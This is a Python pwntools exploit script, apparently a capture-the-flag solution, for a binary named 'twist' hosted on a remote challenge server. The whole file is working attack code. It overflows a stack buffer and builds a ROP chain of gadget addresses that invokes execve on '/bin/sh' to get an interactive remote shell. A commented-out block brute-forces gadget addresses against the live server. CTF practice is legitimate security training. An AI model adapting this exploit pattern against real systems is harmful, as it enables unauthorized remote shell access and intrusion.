from pwn import *

#p = process("./twist")
#p = gdb.debug("./twist")
p = remote("0.cloud.chals.io", 13658)
e = ELF("./twist")

'''
# Local binary
POP_RAX = 0x401349
POP_RDI = 0x401377
POP_RSI = 0x401380
POP_RDX = 0x401364
SYSCALL_RET = 0x40136d
BIN_SH_ADDR = 0x40389e
SYSCALL_VALUE = 0x3b
'''

# Remote binary values
# 0x401349 - rbx
# 0x40135c - rdi
# 0x401365 - rdx
# 0x40136e - rax
# 0x401377 - rcx
# 0x401380 - rsi

POP_RDI = 0x40135c
POP_RSI = 0x401380
POP_RDX = 0x401365
POP_RAX = 0x40136e
SYSCALL_RET = 0x401352

BIN_SH_ADDR = 0x40289e

DEBUG_FUNC = 0x401385
SYSCALL_VALUE = 0x3b

"""
# This comment block is the code I used to brute
# force all of the ROP gadgets on the server
for j in range(0x1000):
    p = remote("0.cloud.chals.io", 13658)
        
    # Get all the intro stuff out
    p.recvuntil(b"calling ")

    p.recvline()
    p.recvline()
    orig_debug = p.recvline().decode()
    #print(orig_debug)
    p.recvline()

    payload = b"A"*8
    payload += b"B"*8
    #payload += p64(DEBUG_FUNC)
    payload += p64(0x401000 + j)
    payload += b"A"*8
    payload += p64(DEBUG_FUNC)
    payload += p64(DEBUG_FUNC)        
    p.sendline(payload)

    all_str = ""
    try:
        p.recvline(timeout=1).decode()
        tmp = p.recvline(timeout=1).decode()
        if "|" not in tmp:
            all_str = "no debug"
        else:
            all_str += tmp + "\n"
    except:
        pass
    
    print(hex(0x401000 + j))
    if "0x41414141" in all_str:
        print(orig_debug)
        print(all_str)

    p.close()

print("done with brute force")
"""

payload = b"A"*8
payload += b"B"*8

payload += p64(POP_RDX)
payload += p64(0)

payload += p64(POP_RSI)
payload += p64(0)

payload += p64(POP_RAX)
payload += p64(SYSCALL_VALUE)

payload += p64(POP_RDI)
payload += p64(BIN_SH_ADDR) 

payload += p64(SYSCALL_RET)


p.sendline(payload)
p.interactive()
